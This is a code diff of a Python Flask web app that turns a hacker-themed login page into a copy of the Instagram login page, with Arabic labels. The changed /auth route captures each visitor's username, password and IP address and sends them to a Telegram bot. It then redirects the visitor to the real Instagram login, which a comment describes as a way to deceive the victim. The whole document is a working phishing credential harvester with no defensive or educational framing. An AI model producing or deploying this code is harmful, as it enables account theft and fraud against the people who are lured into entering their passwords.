@@ -4,39 +4,45 @@ from flask import Flask, request, render_template_string, redirect
 
 app = Flask(__name__)
 
-# --- الإعدادات (تُجلب من Environment Variables في Render) ---
+# الإعدادات من بيئة Render
 TOKEN = os.environ.get('BOT_TOKEN')
 ADMIN_ID = os.environ.get('DEVELOPER_ID')
 
-# --- واجهة الموقع (تصميم الهكر المحترف) ---
-HTML_LOGIN = '''
+# --- واجهة إنستغرام الاحترافية ---
+HTML_INSTA = '''
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cobra System | Login</title>
+    <title>Instagram</title>
     <style>
-        body { background: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .login-box { background: rgba(20, 20, 20, 0.95); padding: 40px; border-radius: 5px; border: 1px solid #00ff41; box-shadow: 0 0 25px rgba(0, 255, 65, 0.2); width: 350px; text-align: center; position: relative; }
-        .login-box::before { content: "SYSTEM ACCESS REQUIRED"; position: absolute; top: -10px; left: 20px; background: #050505; padding: 0 10px; font-size: 12px; }
-        h2 { margin-bottom: 30px; text-transform: uppercase; font-size: 1.5rem; }
-        input { width: 100%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #00ff41; color: #00ff41; border-radius: 3px; box-sizing: border-box; }
-        input::placeholder { color: rgba(0, 255, 65, 0.5); }
-        button { width: 100%; padding: 12px; background: #00ff41; border: none; color: #000; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
-        button:hover { background: #000; color: #00ff41; border: 1px solid #00ff41; box-shadow: 0 0 15px #00ff41; }
-        .warning { color: red; font-size: 0.7rem; margin-top: 20px; text-decoration: blink; }
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .login-container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px 40px; box-sizing: border-box; text-align: center; }
+        .logo { margin: 22px auto 12px; width: 175px; height: 51px; background-image: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560560d9a.png'); background-size: contain; background-repeat: no-repeat; }
+        input { width: 100%; padding: 9px 7px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
+        button { width: 100%; background: #0095f6; border: none; color: white; padding: 5px 0; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 8px; font-size: 14px; }
+        button:disabled { background: #b2dffc; }
+        .separator { margin: 10px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; }
+        .separator::before, .separator::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
+        .fb-login { color: #385185; font-weight: bold; font-size: 14px; cursor: pointer; margin: 20px 0; }
+        .footer-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px; text-align: center; margin-top: 10px; font-size: 14px; box-sizing: border-box; }
+        .footer-box a { color: #0095f6; text-decoration: none; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <h2>🐍 COBRA V10</h2>
+    <div class="login-container">
+        <div class="logo"></div>
         <form method="POST" action="/auth">
-            <input type="text" name="u" placeholder="USERNAME / EMAIL" required>
-            <input type="password" name="p" placeholder="PASSWORD" required>
-            <button type="submit">EXECUTE LOGIN</button>
+            <input type="text" name="u" placeholder="اسم المستخدم أو الهاتف أو البريد" required>
+            <input type="password" name="p" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
         </form>
-        <div class="warning">⚠️ ENCRYPTED CONNECTION ESTABLISHED</div>
+        <div class="separator">أو</div>
+        <div class="fb-login">تسجيل الدخول بحساب فيسبوك</div>
+    </div>
+    <div class="footer-box">
+        ليس لديك حساب؟ <a href="#">تسجيل</a>
     </div>
 </body>
 </html>
@@ -44,38 +50,31 @@ HTML_LOGIN = '''
 
 @app.route('/')
 def index():
-    return render_template_string(HTML_LOGIN)
+    return render_template_string(HTML_INSTA)
 
 @app.route('/auth', methods=['POST'])
 def auth():
-    # استخراج البيانات المدخلة
     user = request.form.get('u')
     pw = request.form.get('p')
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    # جلب معلومات الزائر التقنية
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    agent = request.headers.get('User-Agent')
-    
-    # صياغة الرسالة لبوت تليجرام
+    # رسالة تليجرام
     log_msg = (
-        f"🎯 **[صيد جديد من الموقع]**\n"
+        f"📸 **[حساب Instagram جديد]**\n"
         f"━━━━━━━━━━━━━━━\n"
-        f"👤 **المستخدم:** `{user}`\n"
+        f"👤 **اليوزر:** `{user}`\n"
         f"🔑 **الباسورد:** `{pw}`\n"
         f"━━━━━━━━━━━━━━━\n"
-        f"🌐 **IP:** `{ip}`\n"
-        f"📱 **الجهاز:** `{agent[:80]}...`"
+        f"🌐 **IP:** `{user_ip}`"
     )
     
-    # إرسال البيانات فوراً إلى تليجرام
     try:
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         requests.post(url, data={"chat_id": ADMIN_ID, "text": log_msg, "parse_mode": "Markdown"})
-    except:
-        pass
+    except: pass
 
-    # تحويل المستخدم لموقع حقيقي (تمويه)
-    return redirect("https://www.google.com")
+    # تحويل لإنستغرام الحقيقي لتمويه الضحية
+    return redirect("https://www.instagram.com/accounts/login/")
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
